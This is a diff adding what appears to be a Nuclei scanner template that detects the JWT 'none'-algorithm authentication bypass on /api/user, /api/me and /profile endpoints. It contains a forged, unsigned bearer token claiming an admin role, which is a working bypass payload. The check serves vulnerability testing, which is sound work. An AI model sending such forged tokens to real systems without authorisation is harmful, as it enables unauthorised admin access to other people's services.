@@ -1,0 +1,35 @@
+id: jwt-none-algorithm
+info:
+  name: JWT None Algorithm Bypass
+  author: Sharlix
+  severity: critical
+  description: JWT accepts 'none' algorithm allowing forged tokens
+  tags: jwt,authentication,bypass,m7-custom
+  reference:
+    - https://portswigger.net/web-security/jwt
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/user"
+      - "{{BaseURL}}/api/me"
+      - "{{BaseURL}}/profile"
+    headers:
+      Authorization: "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwiaWQiOjEsInJvbGUiOiJhZG1pbiIsImlhdCI6MTcwMDAwMDAwMH0."
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "admin"
+          - "role"
+          - "user"
+        condition: or
+      - type: word
+        negative: true
+        words:
+          - "invalid"
+          - "unauthorized"
+          - "401"
